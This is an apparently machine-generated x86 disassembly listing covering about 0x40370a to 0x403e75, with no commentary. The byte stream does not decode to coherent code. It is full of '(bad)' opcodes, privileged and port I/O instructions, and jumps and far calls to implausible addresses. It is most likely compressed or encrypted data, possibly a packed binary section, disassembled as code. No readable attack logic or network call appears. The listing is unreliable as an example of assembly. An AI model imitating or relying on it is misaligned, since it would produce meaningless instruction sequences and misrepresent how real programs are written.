  40370a:	fstp   TBYTE PTR [esi]
  40370c:	jmp    0x40369b
  40370e:	xchg   edi,eax
  40370f:	adc    BYTE PTR [eax-0x4f],bh
  403712:	mov    ebx,0x3c291e51
  403717:	(bad)  
  403718:	add    DWORD PTR gs:[ebx+0x32],ecx
  40371c:	dec    edx
  40371d:	sbb    DWORD PTR [esi-0x2257d278],0x63
  403724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403725:	jbe    0x4036c8
  403727:	mov    esp,0xd5b7cad0
  40372c:	sbb    ch,BYTE PTR [ebx-0x33]
  40372f:	mov    eax,ds:0xa3668dab
  403734:	or     ecx,ebp
  403736:	js     0x40376f
  403738:	cmc    
  403739:	adc    DWORD PTR [esp+ebp*4-0x585981e3],ebp
  403740:	or     DWORD PTR [edi],eax
  403742:	inc    esi
  403743:	lahf   
  403744:	push   esi
  403745:	sub    ecx,edx
  403747:	push   cs
  403748:	add    ch,al
  40374a:	je     0x4037c3
  40374c:	(bad)  
  40374d:	out    dx,al
  40374e:	shl    BYTE PTR ds:0x21137fe9,1
  403754:	lahf   
  403755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403756:	pop    es
  403757:	push   esp
  403758:	inc    eax
  403759:	gs inc edi
  40375b:	mov    bh,0xe3
  40375d:	sub    BYTE PTR [edi-0x6b],ch
  403760:	jnp    0x4037d3
  403762:	mov    dl,BYTE PTR [esi+edx*4+0x34]
  403766:	inc    ebx
  403767:	jb     0x403714
  403769:	push   ecx
  40376a:	mov    BYTE PTR [edx+0x34],ah
  40376d:	push   edi
  40376e:	jne    0x403732
  403770:	bound  ecx,QWORD PTR [ecx+edi*8+0x3]
  403774:	aaa    
  403775:	push   0xc9a4c2c9
  40377a:	pop    ebp
  40377b:	pop    esi
  40377c:	mov    al,ds:0xc1a39d35
  403781:	mov    eax,ds:0xeb07a71f
  403786:	cmp    eax,0x8b571a30
  40378b:	mov    dh,0xbb
  40378d:	fninit 
  40378f:	mov    al,0x79
  403791:	jmp    0xc466b7d8
  403796:	lods   al,BYTE PTR ds:[esi]
  403797:	jg     0x403785
  403799:	mov    esi,DWORD PTR [ecx+eiz*8]
  40379c:	das    
  40379d:	mov    ecx,0x2da590b8
  4037a2:	stc    
  4037a3:	mov    al,ds:0x415fce8
  4037a8:	inc    esp
  4037a9:	pop    ebp
  4037aa:	pop    esi
  4037ab:	fbstp  TBYTE PTR [ebp-0x1f]
  4037ae:	mov    edx,DWORD PTR [edx-0x54]
  4037b1:	push   esi
  4037b2:	fsub   QWORD PTR [ebp-0x21b7bd1e]
  4037b8:	cmp    eax,0xb9561ed0
  4037bd:	test   DWORD PTR [eax+ebx*2],0x1b15a6d1
  4037c4:	imul   eax,DWORD PTR [ecx+0x32cc69ce],0x7f
  4037cb:	lods   al,BYTE PTR ds:[esi]
  4037cc:	mov    bh,0x54
  4037ce:	inc    ebp
  4037cf:	fcmovnu st,st(5)
  4037d1:	sub    eax,0xfd1de7d8
  4037d6:	adc    ch,BYTE PTR [esp+eax*4-0x10]
  4037da:	dec    edi
  4037db:	aam    0xc2
  4037dd:	popa   
  4037de:	xchg   ebx,eax
  4037df:	arpl   WORD PTR [edx+0x68],di
  4037e2:	mov    dl,0x7a
  4037e4:	pop    ebx
  4037e5:	stos   BYTE PTR es:[edi],al
  4037e6:	jo     0x403841
  4037e8:	add    BYTE PTR [edi],bh
  4037ea:	mov    esi,0x36928522
  4037ef:	retf   0x681f
  4037f2:	test   al,0xdb
  4037f4:	test   eax,0xf10b2e0
  4037f9:	test   BYTE PTR ds:0xf8fe4fbb,al
  4037ff:	test   edi,ebp
  403801:	std    
  403802:	outs   dx,DWORD PTR ds:[esi]
  403803:	push   ebx
  403804:	and    cl,BYTE PTR [ebx+0x29]
  403807:	add    al,0xc
  403809:	into   
  40380a:	fnstcw WORD PTR [ecx-0x80]
  40380d:	xor    BYTE PTR [esi],bh
  40380f:	test   al,0x9
  403811:	pop    eax
  403812:	outs   dx,BYTE PTR ds:[esi]
  403813:	push   es
  403814:	add    eax,0x46ce5a74
  403819:	dec    edx
  40381a:	cmp    al,0xb
  40381c:	jge    0x403856
  40381e:	adc    cl,BYTE PTR [ecx+ebp*8]
  403821:	add    eax,DWORD PTR [edx+0x629a3c64]
  403827:	dec    eax
  403828:	ds mov esi,0xab1ef71b
  40382e:	pop    ds
  40382f:	xchg   esp,eax
  403830:	xlat   BYTE PTR ds:[ebx]
  403831:	xchg   esp,eax
  403832:	mov    dh,0x71
  403834:	xchg   DWORD PTR [ebx-0x44],ebx
  403837:	add    BYTE PTR ss:[edi],dh
  40383a:	adc    al,0x49
  40383c:	mov    es,WORD PTR [edx+0x2c]
  40383f:	pusha  
  403840:	push   cs
  403841:	adc    DWORD PTR ds:0xa15db25c,ebp
  403847:	pop    edi
  403848:	ss jno 0x4037d0
  40384b:	jo     0x403846
  40384d:	mov    eax,0x52aeeae
  403852:	ss mov ebx,0xf7ca5a0e
  403858:	lahf   
  403859:	jae    0x403801
  40385b:	scas   eax,DWORD PTR es:[edi]
  40385c:	bound  edi,QWORD PTR [ebx]
  40385e:	push   ebp
  40385f:	ja     0x4038ce
  403861:	or     ah,BYTE PTR [edx-0x38]
  403864:	dec    eax
  403865:	add    eax,0x7f99f68a
  40386a:	mov    ss,WORD PTR [ebp-0x48]
  40386d:	cmp    DWORD PTR [ecx-0x4a],eax
  403870:	pop    ecx
  403871:	mov    ebp,ecx
  403873:	test   esp,edi
  403875:	fsqrt  
  403877:	mov    ebx,0xa87c6151
  40387c:	jb     0x403830
  40387e:	daa    
  40387f:	sub    DWORD PTR [esi+0x10],0xffffff8a
  403883:	scas   eax,DWORD PTR es:[edi]
  403884:	mov    ds:0x3b7542f3,al
  403889:	daa    
  40388a:	js     0x403861
  40388c:	outs   dx,DWORD PTR ds:[esi]
  40388d:	sub    bh,BYTE PTR [ebx]
  40388f:	mov    al,ds:0x876847e4
  403894:	xchg   ecx,eax
  403895:	xchg   edx,eax
  403896:	dec    esp
  403897:	jnp    0x4038b7
  403899:	cmp    al,0x8b
  40389b:	or     DWORD PTR [esi],esp
  40389d:	jb     0x403846
  40389f:	in     eax,0x4e
  4038a1:	sysenter 
  4038a3:	cmp    bl,dh
  4038a5:	ins    BYTE PTR es:[edi],dx
  4038a6:	sub    BYTE PTR [eax-0x54],al
  4038a9:	ja     0x4038c9
  4038ab:	loop   0x40386b
  4038ad:	sbb    BYTE PTR [eax],bh
  4038af:	jmp    0x6de9:0x511fbf4f
  4038b6:	push   ebx
  4038b7:	push   ecx
  4038b8:	mov    dl,0x5c
  4038ba:	add    BYTE PTR [ecx+0x4e],dl
  4038bd:	jb     0x403935
  4038bf:	outs   dx,DWORD PTR ds:[esi]
  4038c0:	pop    eax
  4038c1:	dec    eax
  4038c2:	dec    ebx
  4038c3:	loop   0x4038e4
  4038c5:	and    al,BYTE PTR [esi-0xe]
  4038c8:	mov    dh,0x86
  4038ca:	xor    BYTE PTR [esi],bh
  4038cc:	pop    edi
  4038cd:	and    eax,0x2102ce11
  4038d2:	outs   dx,BYTE PTR ds:[esi]
  4038d3:	in     al,0x9a
  4038d5:	test   eax,0xeddae889
  4038da:	pop    ss
  4038db:	pushf  
  4038dc:	jl     0x40394d
  4038de:	cmp    ecx,DWORD PTR [esi+0xebc0e14]
  4038e4:	sub    esp,DWORD PTR [ecx-0x46]
  4038e7:	jae    0x4038e6
  4038e9:	mov    cl,0x79
  4038eb:	js     0x4038db
  4038ed:	clc    
  4038ee:	push   ebp
  4038ef:	test   al,0x9b
  4038f1:	sub    edi,DWORD PTR [ebx-0x64]
  4038f4:	pushf  
  4038f5:	mov    ah,0xf
  4038f7:	inc    edi
  4038f8:	cwde   
  4038f9:	adc    edx,esp
  4038fb:	dec    edi
  4038fc:	sar    DWORD PTR [edx+0x315a8f3],1
  403902:	inc    esp
  403903:	mov    ah,0x56
  403905:	lds    esi,FWORD PTR [ebx-0x5d]
  403908:	push   esi
  403909:	lods   al,BYTE PTR ds:[esi]
  40390a:	xor    al,0xdc
  40390c:	push   es
  40390d:	int    0x23
  40390f:	mov    edi,edi
  403911:	lods   eax,DWORD PTR ds:[esi]
  403912:	and    eax,0xc5c20aab
  403917:	pop    ss
  403918:	add    ebx,DWORD PTR [edx+0x17]
  40391b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40391c:	(bad)  
  40391d:	(bad)  
  40391e:	(bad)  
  40391f:	jno    0x4038df
  403921:	(bad)  [eax+ecx*4+0x7e]
  403925:	wrmsr  
  403927:	dec    ebx
  403928:	mov    al,ds:0xea0510ba
  40392d:	inc    edi
  40392e:	xor    cl,dl
  403930:	rol    ah,0xfe
  403933:	repnz ins DWORD PTR es:[edi],dx
  403935:	dec    ebp
  403936:	rcr    BYTE PTR [ebp+ebx*2+0x46e04789],cl
  40393d:	push   eax
  40393e:	repz sub esi,esi
  403941:	dec    ecx
  403942:	jge    0x403935
  403944:	mov    edx,0x2e869edc
  403949:	cmp    eax,0xafb4a165
  40394e:	mov    ds:0xdb41d100,al
  403953:	fbld   TBYTE PTR [ebx]
  403955:	push   esp
  403956:	jmp    0xff2d99ac
  40395b:	push   edi
  40395c:	inc    esi
  40395d:	ror    dh,1
  40395f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403960:	cs (bad) 
  403963:	retf   
  403964:	icebp  
  403965:	mov    ebx,0xcf06ba6e
  40396a:	push   esp
  40396b:	sbb    DWORD PTR [edi+0x650f6cd2],eax
  403971:	(bad)  
  403972:	(bad)  
  403973:	lahf   
  403974:	sub    ebp,DWORD PTR [eax+ecx*2-0x3]
  403978:	gs adc eax,0x4fd8a803
  40397e:	or     DWORD PTR [ebp+0x30],esp
  403981:	fnstenv [ebx+0x65]
  403984:	jmp    0x7d6f80b3
  403989:	inc    esi
  40398a:	stc    
  40398b:	les    esi,FWORD PTR gs:[ecx+0x271cb737]
  403992:	push   edi
  403993:	push   ebx
  403994:	popa   
  403995:	jecxz  0x4039de
  403997:	mov    ecx,0x584f0bf6
  40399c:	fisttp QWORD PTR [eax+0x1]
  40399f:	ins    BYTE PTR es:[edi],dx
  4039a0:	xchg   esp,edi
  4039a2:	pop    ss
  4039a3:	jl     0x403946
  4039a5:	fcomp  DWORD PTR [edx-0x9]
  4039a8:	or     ecx,DWORD PTR [edi]
  4039aa:	outs   dx,BYTE PTR ds:[esi]
  4039ab:	and    DWORD PTR [eax],0x3e0c3b9e
  4039b1:	out    dx,al
  4039b2:	hlt    
  4039b3:	popf   
  4039b4:	pop    esp
  4039b5:	xchg   esp,eax
  4039b6:	ss jmp 0xf35308d0
  4039bc:	xchg   edx,eax
  4039bd:	inc    edx
  4039be:	scas   al,BYTE PTR es:[edi]
  4039bf:	cwde   
  4039c0:	loope  0x403958
  4039c2:	pop    ss
  4039c3:	pusha  
  4039c4:	lea    edx,[ebp+0x59]
  4039c7:	push   edx
  4039c8:	push   eax
  4039c9:	gs (bad) 
  4039cb:	sbb    eax,eax
  4039cd:	inc    ebp
  4039ce:	shr    DWORD PTR es:[ebp-0x1c596879],0xbd
  4039d6:	push   esi
  4039d7:	test   al,0xa
  4039d9:	push   es
  4039da:	hlt    
  4039db:	jmp    0x4039a0
  4039dd:	or     edi,esp
  4039df:	sub    eax,0x54ae1c86
  4039e4:	sub    BYTE PTR [esi],ah
  4039e6:	int    0xf
  4039e8:	xchg   BYTE PTR [ecx+0x0],bl
  4039eb:	(bad)  [edx+0x5146fd60]
  4039f1:	cmc    
  4039f2:	add    BYTE PTR [esp+esi*1],ch
  4039f5:	in     al,0x24
  4039f7:	aam    0x40
  4039f9:	mov    al,ds:0xd6cf80c9
  4039fe:	add    al,0xdc
  403a00:	mov    ds:0x1939c085,al
  403a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a06:	inc    edi
  403a07:	sub    ebx,edi
  403a09:	push   eax
  403a0a:	xchg   ecx,eax
  403a0b:	xchg   esi,eax
  403a0c:	(bad)  
  403a0d:	fs sahf 
  403a0f:	lods   eax,DWORD PTR ds:[esi]
  403a10:	popf   
  403a11:	xchg   BYTE PTR [eax],ch
  403a13:	retf   
  403a14:	pop    esp
  403a15:	lods   eax,DWORD PTR ds:[esi]
  403a16:	jl     0x403a2a
  403a18:	shl    BYTE PTR [edx],0x2b
  403a1b:	xlat   BYTE PTR ds:[ebx]
  403a1c:	stos   BYTE PTR es:[edi],al
  403a1d:	push   edx
  403a1e:	mov    eax,ds:0x2afd1639
  403a23:	mov    ebp,0x153c9cf0
  403a28:	pop    ss
  403a29:	dec    ebx
  403a2a:	test   DWORD PTR [edx+0x52],ecx
  403a2d:	adc    DWORD PTR [ebx],edi
  403a2f:	xchg   esi,eax
  403a30:	or     DWORD PTR [edi-0x152bec13],edx
  403a36:	es daa 
  403a38:	test   eax,0x29b3491f
  403a3d:	pushf  
  403a3e:	add    dh,BYTE PTR [ebx]
  403a40:	sub    BYTE PTR [edi-0x61be20a4],cl
  403a46:	cmp    DWORD PTR [edx],ebx
  403a48:	lods   eax,DWORD PTR ds:[esi]
  403a49:	cmp    DWORD PTR [edi],eax
  403a4b:	popa   
  403a4c:	test   eax,0x2ecfeef2
  403a51:	retf   
  403a52:	push   0x3b
  403a54:	(bad)  
  403a55:	iret   
  403a56:	jmp    0x3e86:0xbcc6857c
  403a5d:	and    al,0x94
  403a5f:	xor    eax,0x4393cd57
  403a64:	xchg   ebp,eax
  403a65:	(bad)  
  403a66:	aad    0x9e
  403a68:	sub    BYTE PTR [edi+0x61576561],ah
  403a6e:	mov    ds:0xb3dde05e,eax
  403a73:	or     ebx,edi
  403a75:	imul   ebx,DWORD PTR [esi],0x30f48aa9
  403a7b:	or     eax,0x409705e2
  403a80:	cs push ebx
  403a82:	inc    esp
  403a83:	dec    ebx
  403a84:	aas    
  403a85:	and    al,0xd1
  403a87:	xor    al,0x73
  403a89:	mov    eax,DWORD PTR [edx+esi*4]
  403a8c:	shl    dh,cl
  403a8e:	fwait
  403a8f:	pop    ecx
  403a90:	mov    esp,0x2b1d0c91
  403a95:	xor    esi,ecx
  403a97:	lahf   
  403a98:	fstp   TBYTE PTR [edx-0x7f]
  403a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a9c:	push   ebx
  403a9d:	aaa    
  403a9e:	inc    esp
  403a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aa0:	popf   
  403aa1:	(bad)  
  403aa2:	out    0xa9,al
  403aa4:	xor    bh,BYTE PTR [esi]
  403aa6:	aas    
  403aa7:	leave  
  403aa8:	xor    ebx,DWORD PTR [edi]
  403aaa:	inc    eax
  403aab:	jbe    0x403aa7
  403aad:	(bad)  
  403aae:	mov    dl,0xff
  403ab0:	repnz stos DWORD PTR es:[edi],eax
  403ab2:	add    al,0x5e
  403ab4:	(bad)  
  403ab5:	not    DWORD PTR [esi+0x21]
  403ab8:	retf   
  403ab9:	pusha  
  403aba:	retf   0xc47c
  403abd:	xor    eax,0x6023bc1
  403ac2:	mov    dl,0xfe
  403ac4:	nop
  403ac5:	sub    eax,0xea5f5a49
  403aca:	or     DWORD PTR [ebx-0x6b9f896d],edx
  403ad0:	lds    eax,FWORD PTR [ebp+0x25]
  403ad3:	jns    0x403b24
  403ad5:	(bad)  
  403ad6:	out    dx,eax
  403ad7:	(bad)  
  403ad8:	sbb    eax,0xc1cc1fac
  403add:	retf   0xb95
  403ae0:	shr    BYTE PTR [eax],1
  403ae2:	sbb    eax,0xc25faa2f
  403ae7:	mov    ds:0x4fb7ddb3,eax
  403aec:	add    eax,0xe6a9ca1a
  403af1:	bound  edi,QWORD PTR [edx+0x48b9739c]
  403af7:	rcl    DWORD PTR [ebx],1
  403af9:	and    eax,0xbb7b68a7
  403afe:	inc    eax
  403aff:	cdq    
  403b00:	and    al,BYTE PTR [edi]
  403b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b03:	mov    ah,BYTE PTR [ebx+0x304d860f]
  403b09:	(bad)  
  403b0a:	push   edi
  403b0b:	js     0x403b15
  403b0d:	(bad)  
  403b0e:	sbb    cl,BYTE PTR [esi+0x159c71db]
  403b14:	pushf  
  403b15:	inc    esi
  403b16:	cmp    BYTE PTR [ecx+0x6ef4b07b],al
  403b1c:	in     eax,dx
  403b1d:	std    
  403b1e:	add    BYTE PTR [edi+ebp*1],ah
  403b21:	fwait
  403b22:	sahf   
  403b23:	sar    dh,0x90
  403b26:	pushf  
  403b27:	push   edx
  403b28:	inc    ebp
  403b29:	lock icebp 
  403b2b:	xor    bl,bh
  403b2d:	lea    edx,[edi]
  403b2f:	(bad)  
  403b30:	lods   al,BYTE PTR ds:[esi]
  403b31:	xchg   edi,eax
  403b32:	or     al,0x2e
  403b34:	popa   
  403b35:	es pop esi
  403b37:	xor    al,0xf8
  403b3a:	or     BYTE PTR [eax+0x6],bh
  403b3d:	outs   dx,BYTE PTR ds:[esi]
  403b3e:	sub    ah,BYTE PTR [esi+edi*1+0x4f]
  403b42:	mov    ebp,0x82edcff4
  403b47:	pushf  
  403b48:	test   eax,0xa44ff8ca
  403b4d:	xchg   ebx,eax
  403b4e:	and    al,0x22
  403b50:	mov    bl,0x1b
  403b52:	popf   
  403b53:	mov    cl,0xb8
  403b55:	ins    BYTE PTR es:[edi],dx
  403b56:	jb     0x403bb5
  403b58:	jo     0x403ba9
  403b5a:	push   cs
  403b5b:	push   ebx
  403b5c:	sub    cl,dh
  403b5e:	test   al,0x87
  403b60:	mov    al,0x68
  403b62:	(bad)  
  403b63:	stos   DWORD PTR es:[edi],eax
  403b64:	mov    esp,0x71a064b4
  403b69:	inc    edi
  403b6a:	pop    ds
  403b6b:	out    0xcf,al
  403b6d:	jns    0x403b30
  403b6f:	hlt    
  403b70:	or     eax,0xe5c406dc
  403b75:	mov    esp,0xa6a90b0b
  403b7a:	xchg   ebx,eax
  403b7b:	xchg   edx,eax
  403b7c:	pop    dx
  403b7e:	outs   dx,DWORD PTR ds:[esi]
  403b7f:	mov    esp,edi
  403b81:	ret    
  403b82:	add    ch,al
  403b84:	jg     0x403bb8
  403b86:	scas   eax,DWORD PTR es:[edi]
  403b87:	push   esp
  403b88:	fmul   QWORD PTR [ecx-0x63]
  403b8b:	(bad)  
  403b8c:	lods   eax,DWORD PTR ds:[esi]
  403b8d:	retf   0xbe23
  403b90:	fisttp QWORD PTR [edx+0x74f8e36b]
  403b96:	push   esp
  403b97:	push   ss
  403b98:	(bad)  
  403b99:	sub    edx,edx
  403b9b:	jbe    0x403bf5
  403b9d:	or     DWORD PTR [edx+0x2e],0xffffff9a
  403ba1:	(bad)  
  403ba3:	add    ebx,DWORD PTR ds:0x74c3fb31
  403ba9:	pop    edx
  403baa:	sbb    al,0x81
  403bac:	push   esi
  403bad:	fcmovb st,st(4)
  403baf:	pop    ecx
  403bb0:	and    BYTE PTR [ecx+eiz*8],dh
  403bb3:	fnstenv [ebx+eax*4+0x17832ee8]
  403bba:	sub    al,0xc7
  403bbc:	fcomp  st(2)
  403bbe:	outs   dx,BYTE PTR ds:[esi]
  403bbf:	xchg   ebp,eax
  403bc0:	repnz pop esi
  403bc2:	xor    al,0x24
  403bc4:	lahf   
  403bc5:	imul   ebx,ecx,0x44727031
  403bcb:	xor    BYTE PTR [esi],ch
  403bcd:	mov    al,ds:0xe551cbd8
  403bd2:	sbb    al,0xb8
  403bd4:	adc    BYTE PTR [edx+ecx*1+0x62],dh
  403bd8:	fs mov dh,0x75
  403bdb:	jo     0x403c53
  403bdd:	sbb    DWORD PTR [ebx+0x41751f7c],ebp
  403be3:	aaa    
  403be4:	icebp  
  403be5:	adc    eax,esi
  403be7:	repz test DWORD PTR [edx+0x1e],esi
  403beb:	cmp    DWORD PTR [edi],ebx
  403bed:	stos   BYTE PTR es:[edi],al
  403bee:	xchg   edi,eax
  403bef:	lock jbe 0x403c06
  403bf2:	sbb    ebx,DWORD PTR [esi]
  403bf4:	sbb    eax,0xb555a988
  403bf9:	shl    BYTE PTR [eax+0x2e],0x19
  403bfd:	mul    ch
  403bff:	mov    ah,0x8f
  403c01:	push   esp
  403c02:	faddp  st(0),st
  403c04:	imul   esp,DWORD PTR [edi+eiz*2],0x2a35f9fe
  403c0b:	shl    DWORD PTR [eax+0x12],0xe0
  403c0f:	sbb    DWORD PTR [ecx],ebp
  403c11:	mov    BYTE PTR [ebx-0x1a],bh
  403c14:	jg     0x403beb
  403c16:	imul   ebp,ebp,0x10cf9c42
  403c1c:	repnz mov cl,0x94
  403c1f:	ret    0x83d0
  403c22:	adc    eax,0x9fdcee87
  403c27:	xor    al,0x18
  403c29:	fcmove st,st(3)
  403c2b:	cdq    
  403c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c2d:	add    eax,0x77872536
  403c32:	mov    esp,0xf611d075
  403c37:	(bad)  
  403c3a:	(bad)  
  403c3b:	imul   ebx,DWORD PTR ds:0x4f4f6088,0x51d21f0c
  403c45:	jle    0x403bdb
  403c47:	jmp    0x403ca0
  403c49:	test   BYTE PTR [ebx-0x192187f8],0x8
  403c50:	rol    DWORD PTR [eax+esi*2],cl
  403c53:	scas   eax,DWORD PTR es:[edi]
  403c54:	cmc    
  403c55:	inc    eax
  403c56:	lea    ebx,ds:0xfa8ee6cc
  403c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c5d:	xlat   BYTE PTR es:[ebx]
  403c5f:	push   esp
  403c60:	push   edx
  403c61:	and    al,0xb2
  403c63:	test   DWORD PTR [edx-0x70],ecx
  403c66:	xchg   ebx,eax
  403c67:	add    BYTE PTR [edx+0x184699ee],bh
  403c6d:	push   esi
  403c6e:	loope  0x403c7e
  403c70:	sbb    eax,0x41730a80
  403c75:	arpl   WORD PTR [eax*2+0x56b7d8af],ax
  403c7c:	sub    bh,BYTE PTR [esi-0x23206063]
  403c82:	sti    
  403c83:	inc    ebp
  403c84:	int3   
  403c85:	sar    DWORD PTR [esi-0x13],0xd3
  403c89:	and    al,0x4d
  403c8b:	mov    eax,ds:0xbd0c62a5
  403c90:	jb     0x403c7e
  403c92:	dec    eax
  403c93:	or     al,0xa7
  403c95:	or     al,0x5e
  403c97:	shl    BYTE PTR [edx-0x16],0x89
  403c9b:	push   ecx
  403c9c:	jns    0x403d1a
  403c9e:	sub    eax,DWORD PTR ds:[esi]
  403ca1:	jbe    0x403c6c
  403ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca4:	stc    
  403ca5:	pop    edi
  403ca6:	cs imul edi,esp,0x6a8bf7b
  403cad:	(bad)  
  403cae:	xchg   ebx,eax
  403caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cb0:	addr16 aam 0x2a
  403cb3:	cmp    dh,cl
  403cb5:	pop    DWORD PTR [edx+0x2a]
  403cb8:	ja     0x403cc7
  403cba:	mov    al,ds:0xb9377103
  403cbf:	fidiv  DWORD PTR [eax+0x7d]
  403cc2:	jge    0x403d34
  403cc4:	ficomp DWORD PTR [edi+0x59a12220]
  403cca:	stos   BYTE PTR es:[edi],al
  403ccb:	dec    ebp
  403ccc:	dec    edi
  403ccd:	int    0x5a
  403ccf:	mov    ecx,DWORD PTR [edx+0x4b8e30d4]
  403cd5:	test   al,0xee
  403cd7:	es jns 0x403c7b
  403cda:	scas   eax,DWORD PTR es:[edi]
  403cdb:	pop    eax
  403cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cdd:	fdivr  st,st(3)
  403cdf:	fisub  WORD PTR [ebx]
  403ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce2:	xor    BYTE PTR [edi],cl
  403ce4:	xor    al,0xdd
  403ce6:	pop    ebp
  403ce7:	scas   al,BYTE PTR es:[edi]
  403ce8:	leave  
  403ce9:	sub    al,0x39
  403ceb:	into   
  403cec:	shl    BYTE PTR [ebp-0x78],cl
  403cef:	lods   al,BYTE PTR ds:[esi]
  403cf0:	stc    
  403cf1:	xchg   edx,eax
  403cf2:	or     esi,ebx
  403cf4:	pusha  
  403cf5:	and    eax,DWORD PTR [esi-0x18]
  403cf8:	loope  0x403c98
  403cfa:	jecxz  0x403d18
  403cfc:	and    al,0x1d
  403cfe:	dec    esp
  403cff:	fwait
  403d00:	bound  esp,QWORD PTR [edx+0x2161c905]
  403d06:	es xchg ebx,eax
  403d08:	in     al,0x5f
  403d0a:	in     al,dx
  403d0b:	xor    eax,0x39de5a5e
  403d10:	pusha  
  403d11:	xchg   ecx,ebp
  403d13:	fsubr  QWORD PTR [ecx-0x5d9fe163]
  403d19:	push   0x1
  403d1b:	mov    BYTE PTR [edx+0xa],dh
  403d1e:	sbb    al,0x9a
  403d20:	xchg   ecx,eax
  403d21:	sub    BYTE PTR [esi],cl
  403d23:	xchg   BYTE PTR [edx+0x24],dl
  403d26:	xlat   BYTE PTR ds:[ebx]
  403d27:	fbstp  TBYTE PTR [ebp-0x490dfd23]
  403d2d:	mov    cl,0xd4
  403d2f:	aaa    
  403d30:	loopne 0x403da1
  403d32:	inc    esp
  403d33:	sbb    ah,0xa5
  403d36:	jb     0x403d49
  403d38:	or     ah,BYTE PTR [ebx-0x3225d8c5]
  403d3e:	pop    edx
  403d3f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403d41:	adc    al,0x32
  403d43:	loop   0x403ce5
  403d45:	push   es
  403d46:	popf   
  403d47:	gs xor ebx,eax
  403d4a:	int3   
  403d4b:	or     edi,DWORD PTR [ebp-0x24eb0224]
  403d51:	xchg   edx,eax
  403d52:	jp     0x403d4d
  403d54:	inc    esp
  403d55:	popf   
  403d56:	dec    esp
  403d57:	dec    ebx
  403d58:	stc    
  403d59:	(bad)  
  403d5a:	push   edi
  403d5b:	popf   
  403d5c:	pop    esi
  403d5d:	in     al,dx
  403d5e:	mov    esi,ds
  403d60:	xchg   ebp,eax
  403d61:	(bad)  
  403d62:	mov    WORD PTR [ecx],fs
  403d64:	test   DWORD PTR [ecx+0x17b62f90],0xde138d34
  403d6e:	repz int 0x8a
  403d71:	shl    edx,1
  403d73:	imul   eax,edi,0x977665d2
  403d79:	pushf  
  403d7a:	in     eax,dx
  403d7b:	retf   0x413a
  403d7e:	dec    edx
  403d7f:	pop    es
  403d80:	mov    eax,ds:0xd388d678
  403d85:	nop
  403d86:	xchg   edi,eax
  403d87:	retf   0x1702
  403d8a:	mov    edi,0xcddc453
  403d8f:	jle    0x403dfe
  403d91:	sbb    ecx,0x5
  403d94:	pop    esp
  403d95:	iret   
  403d96:	sbb    ecx,ebp
  403d98:	leave  
  403d99:	sub    eax,0x4901147d
  403d9e:	mov    dh,0x11
  403da0:	test   al,0xa8
  403da2:	jl     0x403dd8
  403da4:	dec    edx
  403da5:	push   esp
  403da6:	in     al,dx
  403da7:	add    al,0x58
  403da9:	fcomp  DWORD PTR [ebp-0x1e505146]
  403daf:	aas    
  403db0:	adc    dl,dl
  403db2:	and    eax,0x44e7d828
  403db7:	popa   
  403db8:	sti    
  403db9:	mov    gs:0xed8c8d9c,eax
  403dbf:	clc    
  403dc0:	test   DWORD PTR [ecx+0x6b],ecx
  403dc3:	in     eax,0x4a
  403dc5:	imul   eax,ebx,0xb
  403dc8:	xchg   edi,eax
  403dc9:	mov    edx,0x285d97f0
  403dce:	or     esp,edx
  403dd0:	shr    esi,1
  403dd2:	xchg   edx,eax
  403dd3:	adc    DWORD PTR [edx-0x48c9fc01],edx
  403dd9:	cmp    eax,0xf06689bf
  403dde:	xchg   esp,eax
  403ddf:	arpl   WORD PTR [edi+0x73e09530],cx
  403de5:	sbb    al,BYTE PTR [esi+edx*8+0x402a03c7]
  403dec:	xchg   DWORD PTR [esi],esi
  403dee:	lds    eax,FWORD PTR es:[esi]
  403df1:	mov    ds:0x2fbfe54f,eax
  403df6:	sbb    ecx,eax
  403df8:	and    al,0xf5
  403dfa:	and    eax,0x93492efb
  403dff:	(bad)  
  403e00:	mov    edi,0xf53c9493
  403e05:	adc    al,0x41
  403e07:	daa    
  403e08:	and    dh,BYTE PTR [ecx]
  403e0a:	mov    esi,0x89e0e7e3
  403e0f:	repz push DWORD PTR [edx]
  403e12:	dec    ebx
  403e13:	sahf   
  403e14:	inc    edx
  403e15:	pop    edi
  403e16:	xchg   esi,eax
  403e17:	sub    eax,0xc6f9cc06
  403e1c:	adc    al,0xf3
  403e1e:	and    al,0xf4
  403e20:	lods   eax,DWORD PTR ds:[esi]
  403e21:	test   ecx,0xdd86dc69
  403e27:	mov    edi,0x5aac0fa9
  403e2c:	ret    
  403e2d:	pushf  
  403e2e:	jmp    0x403e5e
  403e30:	rcr    DWORD PTR [ecx],cl
  403e32:	fstp   QWORD PTR [esp+ebp*2]
  403e35:	fsub   QWORD PTR [ebx]
  403e37:	add    esp,esi
  403e39:	outs   dx,BYTE PTR ds:[esi]
  403e3a:	mov    ds:0x28c31768,eax
  403e3f:	dec    eax
  403e40:	fs fdiv st,st(1)
  403e43:	loope  0x403df2
  403e45:	push   ebp
  403e46:	leave  
  403e47:	outs   dx,BYTE PTR ds:[esi]
  403e48:	sub    al,0x5e
  403e4a:	call   0x105e:0x2c7d277
  403e51:	fimul  DWORD PTR [ebx-0x18df29d9]
  403e57:	sub    esi,eax
  403e59:	ja     0x403e27
  403e5b:	fcomp  DWORD PTR [ebp-0x7242fdda]
  403e61:	fist   WORD PTR [edi-0x71fc8ddf]
  403e67:	adc    ah,bh
  403e69:	(bad)  
  403e6a:	jge    0x403eb4
  403e6c:	and    eax,0xa977a4a5
  403e71:	(bad)  
  403e72:	das    
  403e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e74:	push   esp
  403e75:	call   0x36a1353e
